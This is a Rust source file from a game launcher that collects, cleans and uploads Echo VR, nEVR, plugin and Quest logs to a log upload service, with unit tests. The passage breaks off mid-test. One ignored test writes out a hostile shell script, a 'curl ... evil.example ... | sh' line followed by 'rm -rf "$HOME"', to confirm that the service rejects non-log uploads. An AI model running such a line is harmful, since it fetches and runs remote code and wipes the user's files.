//! What "Upload logs" sends: the launcher's own logs, Echo VR's (each installed version's
//! `_local/r14logs`), EchoXR's, nEVR's and its plugins', and the Quest logs saved last. One plain-text
//! bundle (no archive, nothing to unpack), each file cut to its newest part and cleaned
//! so the upload service always takes a real log (it refuses anything that isn't plain
//! text).
//!
//! ```text
//! ECHOVR-LOGS 1
//! FILE launcher/EchoVR_Launcher.log 183455
//! <exactly that many bytes>
//! FILE echo/pc-latest.r14-10-03-2026.log 52011
//! <...>
//! END
//! ```

use std::collections::VecDeque;
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use anyhow::{anyhow, Context, Result};

use super::launcher::nevr;
use super::launcher::store::InstalledVersion;
use super::paths;

/// Where the bundle goes.
pub const UPLOAD_URL: &str = "https://release.echovr.de/launcher/logs";
/// What the service takes at most: per file, files, all files' bytes, per line.
pub const MAX_FILE: usize = 8 << 20;
pub const MAX_FILES: usize = 24;
pub const MAX_TOTAL: usize = 32 << 20;
pub const MAX_LINE: usize = 16 << 10;
/// A run of base64 this long is left out (the service refuses one: that's how payloads,
/// and tokens, end up in text).
const MAX_BASE64_RUN: usize = 1024;

/// The most each group sends, so that one can't crowd the others out of the `MAX_FILES`
/// (what the others don't use, nEVR's and the plugins' logs get).
const LAUNCHER_FILES: usize = 6;
const ECHOXR_FILES: usize = 3;
/// Echo VR's newest logs, across the installed versions, from the last two weeks (under
/// nEVR they hold little: nEVR's own log has the game's lines).
const ECHO_FILES: usize = 2;
const QUEST_FILES: usize = 2;
/// Each plugin's newest logs (and the newest crash records) per version.
const PLUGIN_FILES: usize = 3;
/// What nEVR's and the plugins' logs get at the least: the groups above (6 + 3 + 2 + 2)
/// leave 11 of the 24, room for nEVR's newest log and crash record, the boot log and the
/// newest log of eight plugins.
const PLUGIN_MIN: usize = MAX_FILES - (LAUNCHER_FILES + ECHOXR_FILES + ECHO_FILES + QUEST_FILES);
const RECENT: Duration = Duration::from_secs(14 * 24 * 3600);

/// The launcher's own logs (its window's, Linux' PLAY through Steam, the administrator
/// helper's and the tray's), as `core::log` writes and rotates them, and Proton's output
/// of the last Linux start.
const LAUNCHER_LOGS: [&str; 9] = [
    "EchoVR_Launcher.log",
    "play.log",
    "admin-helper.log",
    "tray.log",
    "proton.log",
    // The rotated ones after the current ones: they go when the room is short.
    "EchoVR_Launcher.log.1",
    "play.log.1",
    "admin-helper.log.1",
    "tray.log.1",
];

/// nEVR's newest logs of a start and crash records, from the last two weeks.
const NEVR_FILES: usize = 4;

/// Where a log is from (its folder in the bundle).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Kind {
    Launcher,
    EchoXr,
    Echo,
    Plugin,
    Quest,
}

impl Kind {
    pub const ALL: [Kind; 5] = [
        Kind::Launcher,
        Kind::EchoXr,
        Kind::Echo,
        Kind::Plugin,
        Kind::Quest,
    ];

    fn dir(self) -> &'static str {
        match self {
            Kind::Launcher => "launcher",
            Kind::EchoXr => "echoxr",
            Kind::Echo => "echo",
            Kind::Plugin => "plugin",
            Kind::Quest => "quest",
        }
    }

    /// Its row in the upload card.
    pub fn title(self) -> &'static str {
        match self {
            Kind::Launcher => "Launcher",
            Kind::EchoXr => "EchoXR",
            Kind::Echo => "Echo VR",
            Kind::Plugin => "nEVR and plugins",
            Kind::Quest => "Quest",
        }
    }

    /// Whose logs, in a sentence.
    pub fn label(self) -> &'static str {
        match self {
            Kind::Launcher => "the launcher",
            Kind::EchoXr => "EchoXR",
            Kind::Echo => "Echo VR",
            Kind::Plugin => "nEVR and its plugins",
            Kind::Quest => "your Quest",
        }
    }
}

/// One log to send.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Source {
    pub kind: Kind,
    /// Its name in the bundle: `[A-Za-z0-9._-]`, at most 100 characters.
    pub name: String,
    pub path: PathBuf,
    /// How much of it goes (its newest part, at most `MAX_FILE`).
    pub bytes: u64,
}

/// Pure: a file name as the service takes it.
pub fn bundle_name(name: &str) -> String {
    let clean: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '_'
            }
        })
        .collect();
    // Keep the end (the extension) when it's too long.
    let start = clean.len().saturating_sub(100);
    let clean = &clean[start..];
    if clean.is_empty() || clean.chars().all(|c| c == '.') {
        "log".into()
    } else {
        clean.to_string()
    }
}

fn modified(path: &Path) -> Option<SystemTime> {
    std::fs::metadata(path).and_then(|m| m.modified()).ok()
}

/// The non-empty files in `dir` whose names pass `keep`, newest first. Size and time come
/// from each file itself: on Windows the folder's listing keeps a file's size (0 for a new
/// one) until it is closed, so a running game's log would look empty.
pub(crate) fn newest_in(dir: &Path, keep: impl Fn(&str) -> bool) -> Vec<(PathBuf, SystemTime)> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut files: Vec<(PathBuf, SystemTime)> = entries
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_file()))
        .filter(|e| keep(&e.file_name().to_string_lossy()))
        .filter_map(|e| {
            let m = std::fs::metadata(e.path()).ok()?;
            (m.len() > 0).then_some((e.path(), m.modified().ok()?))
        })
        .collect();
    files.sort_by_key(|f| std::cmp::Reverse(f.1));
    files
}

fn is_log(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    n.ends_with(".log") || n.ends_with(".txt")
}

fn source(kind: Kind, name: &str, path: PathBuf) -> Option<Source> {
    let len = std::fs::metadata(&path).ok()?.len();
    (len > 0).then(|| Source {
        kind,
        name: bundle_name(name),
        bytes: len.min(MAX_FILE as u64),
        path,
    })
}

/// Every log there is to send, by kind, at most `MAX_FILES`: from the launcher's log
/// folder `log_dir`, nEVR's `nevr_dirs` ([`nevr::log_dirs`]), and the installed versions (with their plugins'
/// `plugin_logs`). Each group has a most (so none crowds the others out); nEVR's and the
/// plugins' logs get what is left, the newest log of each of them first.
fn collect_from(
    log_dir: &Path,
    nevr_dirs: &[PathBuf],
    versions: &[InstalledVersion],
    now: SystemTime,
) -> Vec<Source> {
    let recent = |t: &SystemTime| now.duration_since(*t).map_or(true, |age| age <= RECENT);
    let launcher: Vec<Source> = LAUNCHER_LOGS
        .iter()
        .filter_map(|n| source(Kind::Launcher, n, log_dir.join(n)))
        .take(LAUNCHER_FILES)
        .collect();
    let present: Vec<&InstalledVersion> = versions.iter().filter(|v| v.present()).collect();
    let mut echoxr = Vec::new();
    for v in &present {
        let dir = v.bin_dir().join(super::echoxr::DIR);
        for n in ["launcher.log", "runtime.log", "platform.log"] {
            echoxr.extend(source(Kind::EchoXr, &format!("{}.{n}", v.id), dir.join(n)));
        }
    }
    echoxr.truncate(ECHOXR_FILES);
    // Echo VR's newest, whichever version they're from.
    let mut echo: Vec<(&InstalledVersion, PathBuf, SystemTime)> = present
        .iter()
        .flat_map(|v| {
            let dir = Path::new(&v.root)
                .join(paths::ARENA_DIR)
                .join("_local/r14logs");
            newest_in(&dir, is_log)
                .into_iter()
                .map(move |(p, t)| (*v, p, t))
        })
        .filter(|(_, _, t)| recent(t))
        .collect();
    echo.sort_by_key(|e| std::cmp::Reverse(e.2));
    let echo: Vec<Source> = echo
        .into_iter()
        .take(ECHO_FILES)
        .filter_map(|(v, p, _)| {
            let name = format!(
                "{}.{}",
                v.id,
                p.file_name().unwrap_or_default().to_string_lossy()
            );
            source(Kind::Echo, &name, p)
        })
        .collect();
    // The Quest's logs as "Quest logs" saved them last (a folder each time).
    let mut quest: Vec<Source> = Vec::new();
    if let Some((dir, _)) = newest_in_dirs(&log_dir.join("quest")).filter(|(_, t)| recent(t)) {
        let mut files: Vec<(PathBuf, SystemTime)> = std::fs::read_dir(&dir)
            .into_iter()
            .flatten()
            .filter_map(Result::ok)
            .flat_map(|e| newest_in(&e.path(), is_log))
            .collect();
        files.sort_by_key(|f| std::cmp::Reverse(f.1));
        quest.extend(files.into_iter().take(QUEST_FILES).filter_map(|(p, _)| {
            let name = p
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .into_owned();
            source(Kind::Quest, &name, p)
        }));
    }
    let room = MAX_FILES
        .saturating_sub(launcher.len() + echoxr.len() + echo.len() + quest.len())
        .max(PLUGIN_MIN);
    let plugins = nevr_and_plugin_logs(nevr_dirs, &present, &recent);
    let mut out = launcher;
    out.extend(echoxr);
    out.extend(echo);
    out.extend(plugins.into_iter().take(room));
    out.extend(quest);
    out.truncate(MAX_FILES);
    out
}

/// nEVR's logs and its plugins', in the order they are worth keeping when the room is
/// short: first nEVR's newest run and newest crash record, each version's boot log and
/// the newest log of every plugin (so none is missing), then the next of each.
fn nevr_and_plugin_logs(
    nevr_dirs: &[PathBuf],
    versions: &[&InstalledVersion],
    recent: &impl Fn(&SystemTime) -> bool,
) -> Vec<Source> {
    let is_crash = |p: &PathBuf| {
        p.file_name()
            .is_some_and(|n| nevr::is_crash_log(&n.to_string_lossy()))
    };
    let mut all: Vec<(PathBuf, SystemTime)> = nevr_dirs
        .iter()
        .flat_map(|d| newest_in(d, |n| nevr::is_run_log(n) || nevr::is_crash_log(n)))
        .filter(|(_, t)| recent(t))
        .collect();
    all.sort_by_key(|f| std::cmp::Reverse(f.1));
    let mut nevr: Vec<(PathBuf, SystemTime)> = all.iter().take(NEVR_FILES).cloned().collect();
    // The newest crash record even behind more runs than that (or written in the same
    // tick as them).
    if !nevr.iter().any(|(p, _)| is_crash(p)) {
        nevr.extend(all.iter().find(|(p, _)| is_crash(p)).cloned());
    }
    // The newest run and the newest crash record lead.
    let first_run = nevr.iter().position(|(p, _)| !is_crash(p));
    let first_crash = nevr.iter().position(|(p, _)| is_crash(p));
    let mut lead = Vec::new();
    for at in [first_run, first_crash].into_iter().flatten() {
        lead.push(at);
    }
    lead.sort_unstable();
    let mut nevr_first = Vec::new();
    for at in lead.into_iter().rev() {
        nevr_first.push(nevr.remove(at));
    }
    nevr_first.reverse();
    let nevr_source = |(p, _): (PathBuf, SystemTime)| {
        let name = p.file_name()?.to_string_lossy().into_owned();
        source(Kind::Plugin, &name, p)
    };
    let mut out: Vec<Source> = nevr_first.into_iter().filter_map(nevr_source).collect();
    // nEVR's host's log (5.8 on: which runtime it found, and why it didn't load it).
    out.extend(
        nevr_dirs
            .iter()
            .map(|d| d.join(nevr::HOST_LOG))
            .find(|p| p.is_file())
            .filter(|p| modified(p).is_some_and(|t| recent(&t)))
            .and_then(|p| source(Kind::Plugin, "nevr-bootstrap.jsonl", p)),
    );
    // Each version's boot log, then each plugin folder's logs, newest first.
    let mut folders: Vec<VecDeque<Source>> = Vec::new();
    for v in versions {
        let (boot, plugin_folders) = plugin_logs(v, recent);
        out.extend(boot);
        folders.extend(plugin_folders.into_iter().map(VecDeque::from));
    }
    // Round by round: every folder's newest, then every folder's second, ...
    for round in 0..PLUGIN_FILES {
        if round == 1 {
            out.extend(nevr.drain(..).filter_map(nevr_source));
        }
        out.extend(folders.iter_mut().filter_map(VecDeque::pop_front));
    }
    out.extend(nevr.drain(..).filter_map(nevr_source));
    out
}

/// `v`'s nEVR boot log, and a list for each plugin folder (and the files of
/// `plugin_logs` itself, such as the old loader's), the newest first.
fn plugin_logs(
    v: &InstalledVersion,
    recent: &impl Fn(&SystemTime) -> bool,
) -> (Option<Source>, Vec<Vec<Source>>) {
    let bin = v.bin_dir();
    let dir = super::launcher::mods::log_dir(&bin);
    let boot = nevr::boot_log(&bin);
    let boot = Some(boot)
        .filter(|p| modified(p).is_some_and(|t| recent(&t)))
        .and_then(|p| source(Kind::Plugin, &format!("{}.nevr-boot.jsonl", v.id), p));
    let mut folders: Vec<PathBuf> = std::fs::read_dir(&dir)
        .into_iter()
        .flatten()
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .map(|e| e.path())
        .collect();
    folders.sort();
    // The folder itself last: logs a plugin keeps beside the folders, as a folder of their own.
    folders.push(dir.clone());
    let lists = folders
        .into_iter()
        .map(|folder| {
            let label = (folder != dir).then(|| {
                folder
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .into_owned()
            });
            newest_in(&folder, is_log)
                .into_iter()
                .filter(|(_, t)| recent(t))
                .take(PLUGIN_FILES)
                .filter_map(|(p, _)| {
                    let file = p
                        .file_name()
                        .unwrap_or_default()
                        .to_string_lossy()
                        .into_owned();
                    let name = match &label {
                        Some(label) => format!("{}.{label}.{file}", v.id),
                        None => format!("{}.{file}", v.id),
                    };
                    source(Kind::Plugin, &name, p)
                })
                .collect::<Vec<_>>()
        })
        .filter(|l| !l.is_empty())
        .collect();
    (boot, lists)
}

/// The newest folder in `dir`.
fn newest_in_dirs(dir: &Path) -> Option<(PathBuf, SystemTime)> {
    std::fs::read_dir(dir)
        .ok()?
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .filter_map(|e| Some((e.path(), modified(&e.path())?)))
        .max_by_key(|(_, t)| *t)
}

/// Every log there is to send for these installed versions.
pub fn collect(versions: &[InstalledVersion]) -> Vec<Source> {
    let mut out = collect_from(
        &paths::log_dir(),
        &nevr::log_dirs(),
        versions,
        SystemTime::now(),
    );
    out.extend(server_consoles(
        &crate::core::server_host::dir().join("servers"),
    ));
    out.truncate(MAX_FILES);
    out
}

/// The game servers' consoles (Server host plugin; nEVR's lines of each), newest first, at
/// most 4: with the plugins' logs.
fn server_consoles(dir: &Path) -> Vec<Source> {
    let mut found: Vec<(PathBuf, SystemTime, String)> = std::fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            let p = e.path().join(crate::core::server_host::status::CONSOLE);
            let t = modified(&p)?;
            Some((p, t, e.file_name().to_string_lossy().to_string()))
        })
        .collect();
    found.sort_by_key(|f| std::cmp::Reverse(f.1));
    found
        .into_iter()
        .take(4)
        .filter_map(|(p, _, name)| source(Kind::Plugin, &format!("server-{name}-console.log"), p))
        .collect()
}

/// Pure: `text`'s newest part of at most `max` bytes, starting at a character, and at a
/// line when there is one.
fn tail_str(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut start = text.len() - max;
    while !text.is_char_boundary(start) {
        start += 1;
    }
    let cut = &text[start..];
    match cut.find('\n') {
        Some(i) if i + 1 < cut.len() => &cut[i + 1..],
        _ => cut,
    }
}

/// Pure: `bytes`' newest part of at most `max` bytes, starting at a line.
fn tail(bytes: &[u8], max: usize) -> &[u8] {
    if bytes.len() <= max {
        return bytes;
    }
    let cut = &bytes[bytes.len() - max..];
    match cut.iter().position(|&b| b == b'\n') {
        Some(i) => &cut[i + 1..],
        None => cut,
    }
}

/// Pure: whether `c` stays in a cleaned log: printable ASCII, tab and newline, and any
/// letter or digit. Everything else non-ASCII (controls, format and bidi characters,
/// private use, line separators, symbols) becomes `?`, so the service's text rules never
/// refuse a real log.
fn keeps(c: char) -> bool {
    matches!(c, '\t' | '\n' | ' '..='~') || (!c.is_ascii() && c.is_alphanumeric())
}

/// Pure: `bytes` as clean text: invalid UTF-8 replaced, a CR without LF a line break,
/// characters `keeps` doesn't keep as `?`, long base64 runs left out, and lines over
/// `MAX_LINE` bytes broken.
pub fn sanitize(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    let mut out = String::with_capacity(text.len());
    let mut run = String::new();
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        let c = match c {
            '\r' if chars.peek() == Some(&'\n') => '\r',
            '\r' => '\n',
            c if keeps(c) => c,
            _ => '?',
        };
        if c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=') {
            run.push(c);
            continue;
        }
        flush_run(&mut out, &mut run);
        out.push(c);
    }
    flush_run(&mut out, &mut run);
    // Dev codes keep a developer's folder private: never in an upload.
    break_lines(&crate::core::launcher::dev_code::redact(&out))
}

/// Appends a run of base64 characters, or a note in its place when it's long.
fn flush_run(out: &mut String, run: &mut String) {
    if run.len() >= MAX_BASE64_RUN {
        out.push_str(&format!("[{} base64 characters left out]", run.len()));
    } else {
        out.push_str(run);
    }
    run.clear();
}

/// Pure: `text` with every line longer than `MAX_LINE` bytes broken (at characters).
fn break_lines(text: &str) -> String {
    if text.split('\n').all(|l| l.len() <= MAX_LINE) {
        return text.to_string();
    }
    let mut out = String::with_capacity(text.len() + 64);
    for (i, l) in text.split('\n').enumerate() {
        if i > 0 {
            out.push('\n');
        }
        let mut n = 0;
        for c in l.chars() {
            if n + c.len_utf8() > MAX_LINE {
                out.push('\n');
                n = 0;
            }
            out.push(c);
            n += c.len_utf8();
        }
    }
    out
}

/// The bundle of `sources`: each file's newest part, cleaned, all of them within
/// `MAX_TOTAL` (smaller files first, so the big ones share what's left).
pub fn bundle(sources: &[Source]) -> Result<Vec<u8>> {
    let mut order: Vec<usize> = (0..sources.len()).collect();
    order.sort_by_key(|&i| sources[i].bytes);
    let mut budget = MAX_TOTAL;
    let mut texts: Vec<Option<String>> = vec![None; sources.len()];
    for (k, &i) in order.iter().enumerate() {
        let share = (budget / (order.len() - k)).min(MAX_FILE);
        let Ok(bytes) = std::fs::read(&sources[i].path) else {
            continue;
        };
        // Cleaning can grow it (a note for a base64 run): cut again, at a character.
        let clean = sanitize(tail(&bytes, share));
        let text = tail_str(&clean, share).to_string();
        budget -= text.len();
        texts[i] = Some(text);
    }
    let mut out = b"ECHOVR-LOGS 1\n".to_vec();
    for (s, text) in sources.iter().zip(texts) {
        let Some(text) = text.filter(|t| !t.is_empty()) else {
            continue;
        };
        out.extend(format!("FILE {}/{} {}\n", s.kind.dir(), s.name, text.len()).as_bytes());
        out.extend(text.as_bytes());
    }
    out.extend(b"END\n");
    Ok(out)
}

/// Where the bundle goes: debug builds may point elsewhere (`ECHOVR_LOG_UPLOAD_URL`) to
/// try a local service.
fn upload_url() -> String {
    if cfg!(debug_assertions) {
        if let Ok(url) = std::env::var("ECHOVR_LOG_UPLOAD_URL") {
            return url;
        }
    }
    UPLOAD_URL.into()
}

/// Pure: the last Echo VR account ("OVR-ORG-" and its number, the XPID) in a game log.
pub fn last_oid(text: &str) -> Option<String> {
    let mut found = None;
    let mut rest = text;
    while let Some(at) = rest.find("OVR-ORG-") {
        let digits: String = rest[at + 8..]
            .chars()
            .take_while(char::is_ascii_digit)
            .take(24)
            .collect();
        if digits.len() >= 3 {
            found = Some(format!("OVR-ORG-{digits}"));
        }
        rest = &rest[at + 8..];
    }
    found
}

/// The Echo VR account this PC played with last: the newest game log that names one.
pub fn find_oid(versions: &[InstalledVersion]) -> Option<String> {
    collect(versions)
        .iter()
        .filter(|s| s.kind == Kind::Echo)
        .find_map(|s| last_oid(&String::from_utf8_lossy(&std::fs::read(&s.path).ok()?)))
}

/// Who uploads: the EchoVRCE session (the service reads the account's IDs with it, and
/// takes uploads only from signed-in players), and the Echo VR account of this PC.
pub struct Uploader {
    pub token: String,
    pub oid: Option<String>,
    /// A mod report ("Report this mod"): the mod (`id@version`) and what the player says
    /// happened. The moderators' post names it.
    pub report: Option<(String, String)>,
}

/// Sends `bundle`; the reference the service gives it, or what went wrong in plain words.
pub fn upload(bundle: Vec<u8>, who: &Uploader) -> Result<String> {
    let url = upload_url();
    let (status, body) = super::http::block_on(async {
        let mut req = super::http::client()
            .post(&url)
            // Sending, then the service's checks (its file type check takes a while).
            .timeout(Duration::from_secs(600))
            .header("Content-Type", "text/plain; charset=utf-8")
            .header("Authorization", format!("Bearer {}", who.token));
        if let Some(oid) = &who.oid {
            req = req.header("X-Echo-OID", oid);
        }
        if let Some((what, note)) = &who.report {
            let enc =
                |t: &str| url::form_urlencoded::byte_serialize(t.as_bytes()).collect::<String>();
            req = req.header("X-Report-Mod", enc(what));
            let note: String = note.chars().take(500).collect();
            req = req.header("X-Report-Note", enc(&note));
        }
        let resp = req
            .body(bundle)
            .send()
            .await
            .context("Couldn't reach the log upload service")?;
        let status = resp.status().as_u16();
        Ok::<_, anyhow::Error>((status, resp.text().await.unwrap_or_default()))
    })?;
    let json: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
    let field = |k: &str| json.get(k).and_then(|v| v.as_str()).map(str::to_string);
    match status {
        200 | 201 => field("code")
            .filter(|c| c.len() <= 32 && c.chars().all(|ch| ch.is_ascii_alphanumeric()))
            .ok_or_else(|| anyhow!("The log upload service answered without a reference.")),
        401 => Err(anyhow!(
            "EchoVRCE didn't accept your sign-in: sign in again on the EchoVRCE page, then upload again."
        )),
        429 => Err(anyhow!(
            "Too many uploads from your network: try again in an hour."
        )),
        413 => Err(anyhow!("The logs are too large for the upload service.")),
        503 => Err(anyhow!(
            "The log upload service is busy right now: try again in a few minutes."
        )),
        _ => Err(anyhow!(
            "The log upload service didn't take the logs ({status}){}",
            field("error")
                .filter(|e| e.len() < 200)
                .map(|e| format!(": {e}"))
                .unwrap_or_default()
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_the_last_echo_account() {
        let log = "[10-05-2026] [14:58:11]: [NSUSER] saved C:\\users\\steamuser\\AppData\\Local\\RAD\\EchoVR\\users\\OVR-ORG\\1\\clientprofile.json\n\
                   [10-05-2026] [15:00:22]: [NSUSER] Destroying user OVR-ORG-3963667097037078\n\
                   [10-05-2026] [15:00:22]: [LOGIN] Logging OVR-ORG-3963667097037079 out\n";
        assert_eq!(last_oid(log).as_deref(), Some("OVR-ORG-3963667097037079"));
        assert_eq!(last_oid("OVR-ORG\\1\\x OVR-ORG-12"), None);
        assert_eq!(last_oid(""), None);
    }

    #[test]
    fn names_files_safely() {
        assert_eq!(bundle_name("EchoVR_Launcher.log"), "EchoVR_Launcher.log");
        assert_eq!(
            bundle_name("[r14]-[10-03-2026]_[14-22-31]_1234.log"),
            "_r14_-_10-03-2026___14-22-31__1234.log"
        );
        assert_eq!(bundle_name("../../etc/passwd"), ".._.._etc_passwd");
        assert_eq!(bundle_name(".."), "log");
        assert_eq!(bundle_name(""), "log");
        let long = format!("{}.log", "a".repeat(200));
        assert_eq!(bundle_name(&long).len(), 100);
        assert!(bundle_name(&long).ends_with(".log"));
    }

    #[test]
    fn cleans_what_the_service_refuses() {
        // Escape sequences, bidi overrides, zero-width and private-use characters, NUL,
        // a bare CR and invalid UTF-8; letters stay.
        let dirty = "a\x1b[31mred\u{202E}x\u{200B}y\u{E000}\0z\rnext Jürgen 日本\n".as_bytes();
        let mut dirty = dirty.to_vec();
        dirty.extend(b"\xff\xfe end\r\n");
        let clean = sanitize(&dirty);
        assert_eq!(clean, "a?[31mred?x?y??z\nnext Jürgen 日本\n?? end\r\n");
        assert!(clean.chars().all(|c| c == '\r' || keeps(c)));
    }

    #[test]
    fn leaves_long_base64_out_and_breaks_long_lines() {
        let blob = "QUJD".repeat(300);
        let clean = sanitize(format!("token {blob} end\n").as_bytes());
        assert_eq!(clean, "token [1200 base64 characters left out] end\n");
        let short = "QUJD".repeat(10);
        assert_eq!(sanitize(short.as_bytes()), short);
        let long = "a b ".repeat(MAX_LINE);
        let clean = sanitize(long.as_bytes());
        assert!(clean.split('\n').all(|l| l.len() <= MAX_LINE));
        assert_eq!(clean.replace('\n', ""), long);
    }

    #[test]
    fn keeps_the_newest_part() {
        assert_eq!(tail(b"one\ntwo\nthree\n", 100), b"one\ntwo\nthree\n");
        assert_eq!(tail(b"one\ntwo\nthree\n", 9), b"three\n");
        assert_eq!(tail_str("one\ntwo\nthree\n", 9), "three\n");
        // No line to start at, and a character cut through: from the next character.
        assert_eq!(tail_str("ääää", 5), "ää");
    }

    fn write(path: &Path, text: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    #[test]
    fn takes_the_servers_consoles() {
        let dir = tempfile::tempdir().unwrap();
        for (n, text) in [("echo-1", "a\n"), ("echo-2", "")] {
            std::fs::create_dir_all(dir.path().join(n)).unwrap();
            std::fs::write(dir.path().join(n).join("console.log"), text).unwrap();
        }
        let s = server_consoles(dir.path());
        assert_eq!(s.len(), 1);
        assert_eq!(s[0].name, "server-echo-1-console.log");
        assert_eq!(s[0].kind, Kind::Plugin);
    }

    #[test]
    fn collects_every_kind_and_bundles_them() {
        let dir = tempfile::tempdir().unwrap();
        let logs = dir.path().join("logs");
        write(
            &logs.join("EchoVR_Launcher.log"),
            "2026-10-03T10:00:00Z  INFO hi\n",
        );
        write(&logs.join("play.log"), "");
        let root = dir.path().join("pc");
        let bin = root.join(paths::ARENA_DIR).join("bin/win10");
        write(&bin.join("echovr.exe"), "MZ");
        write(&bin.join("EchoXR/launcher.log"), "===== launch =====\n");
        let r14 = root.join(paths::ARENA_DIR).join("_local/r14logs");
        for i in 0..7 {
            write(
                &r14.join(format!("[r14]-{i}.log")),
                &format!("[10-03-2026] [10:00:0{i}]: x\n"),
            );
        }
        write(
            &bin.join("logs/nevr-boot.jsonl"),
            "{\"msg\":\"[NEVR.BOOT] up\"}\n",
        );
        let nevr_dir = dir.path().join("EchoVR/logs");
        write(
            &nevr_dir.join("nevr-2026-10-04T10-00-00.000.jsonl"),
            "{\"msg\":\"[NEVR.PLUGIN] plugin load complete: 1/1 loaded\"}\n",
        );
        write(&nevr_dir.join("nevr-crash-1.txt"), "crash\n");
        write(
            &dir.path().join("nevr/echovr/logs/nevr-bootstrap.jsonl"),
            "{\"event\":\"runtime_load\",\"outcome\":\"loaded\"}\n",
        );
        write(
            &nevr_dir.join(".credentials.json"),
            "{\"refresh_token\":\"x\"}\n",
        );
        write(
            &bin.join("plugin_logs/NvrAssetPatches/NvrAssetPatches.log"),
            "plugin says hi\n",
        );
        write(
            &bin.join("plugin_logs/crashes/2026-10-03T10-00-00Z.txt"),
            "crash\n",
        );
        write(
            &bin.join("plugin_logs/NvrAssetPatches/patch.bin"),
            "not a log\n",
        );
        write(
            &logs.join("quest/2026-10-03_10-00-00/r14logs/a.log"),
            "quest\n",
        );
        let v = InstalledVersion {
            id: "pc-latest".into(),
            root: paths::normalize(&root.to_string_lossy()),
            ..Default::default()
        };
        let sources = collect_from(
            &logs,
            &nevr::log_dirs_in(dir.path()),
            &[v],
            SystemTime::now(),
        );
        let count = |k: Kind| sources.iter().filter(|s| s.kind == k).count();
        assert_eq!(count(Kind::Launcher), 1, "the empty play.log is left out");
        assert_eq!(count(Kind::EchoXr), 1);
        assert_eq!(count(Kind::Echo), ECHO_FILES);
        assert_eq!(count(Kind::Plugin), 6);
        assert_eq!(count(Kind::Quest), 1);
        let mut plugin: Vec<_> = sources
            .iter()
            .filter(|s| s.kind == Kind::Plugin)
            .map(|s| s.name.as_str())
            .collect();
        // nEVR's own come first, newest first (written in the same instant here).
        plugin[..2].sort();
        assert_eq!(
            plugin,
            [
                "nevr-2026-10-04T10-00-00.000.jsonl",
                "nevr-crash-1.txt",
                "nevr-bootstrap.jsonl",
                "pc-latest.nevr-boot.jsonl",
                "pc-latest.NvrAssetPatches.NvrAssetPatches.log",
                "pc-latest.crashes.2026-10-03T10-00-00Z.txt"
            ]
        );

        let b = String::from_utf8(bundle(&sources).unwrap()).unwrap();
        let first = "2026-10-03T10:00:00Z  INFO hi\n";
        assert!(b.starts_with(&format!(
            "ECHOVR-LOGS 1\nFILE launcher/EchoVR_Launcher.log {}\n{first}",
            first.len()
        )));
        assert!(b.contains("FILE echoxr/pc-latest.launcher.log 19\n===== launch =====\n"));
        assert!(b.contains(
            "FILE plugin/pc-latest.NvrAssetPatches.NvrAssetPatches.log 15\nplugin says hi\n"
        ));
        assert!(b.ends_with("END\n"));
    }

    /// The launcher's own logs, bundled and sent to a local service:
    /// a log upload service on port 8787, then
    /// `ECHOVR_LOG_UPLOAD_URL=http://127.0.0.1:8787/launcher/logs cargo test uploads -- --ignored`.
    #[test]
    #[ignore = "needs a local log upload service"]
    fn uploads_to_the_service() {
        let sources = collect(&[]);
        assert!(!sources.is_empty(), "no launcher logs here");
        let who = Uploader {
            token: "dev".into(),
            oid: Some("OVR-ORG-123".into()),
            report: None,
        };
        let code = upload(bundle(&sources).unwrap(), &who).unwrap();
        assert_eq!(code.len(), 8, "{code}");
        // Not a log: refused, with the service's own words.
        let script = "#!/bin/sh\nset -e\ncurl -s http://evil.example/x | sh\nrm -rf \"$HOME\"\n";
        let body = format!(
            "ECHOVR-LOGS 1\nFILE launcher/a.log {}\n{script}END\n",
            script.len()
        );
        let err = upload(body.into_bytes(), &who).unwrap_err().to_string();
        assert!(err.contains("doesn't look like a log"), "{err}");
    }

    /// Every plugin's log gets sent even when every group is full: nEVR's own logs, a
    /// crash record, and EchoCombat's four plugins besides nEVR's own (none is crowded out
    /// for being late in the alphabet).
    /// nEVR's newest crash record goes even behind more runs than it keeps, whatever the
    /// order the files' times put them in.
    #[test]
    fn sends_the_newest_crash_record_behind_newer_runs() {
        let dir = tempfile::tempdir().unwrap();
        let nevr_dir = dir.path().join("EchoVR/logs");
        std::fs::create_dir_all(&nevr_dir).unwrap();
        let at = |secs: u64| SystemTime::now() - std::time::Duration::from_secs(3600 - secs);
        let put = |name: &str, secs: u64| {
            let path = nevr_dir.join(name);
            std::fs::write(&path, "x\n").unwrap();
            let f = std::fs::File::options().write(true).open(&path).unwrap();
            f.set_modified(at(secs)).unwrap();
        };
        put("nevr-crash-1.txt", 0);
        for i in 0..NEVR_FILES + 2 {
            put(
                &format!("nevr-2026-10-04T10-00-0{i}.000.jsonl"),
                10 + i as u64,
            );
        }
        let out = nevr_and_plugin_logs(std::slice::from_ref(&nevr_dir), &[], &|_| true);
        let names: Vec<&str> = out.iter().map(|s| s.name.as_str()).collect();
        assert!(names.contains(&"nevr-crash-1.txt"), "{names:?}");
        assert_eq!(names.len(), NEVR_FILES + 1, "{names:?}");
    }

    #[test]
    fn sends_every_plugins_log_when_the_room_is_short() {
        let dir = tempfile::tempdir().unwrap();
        let logs = dir.path().join("logs");
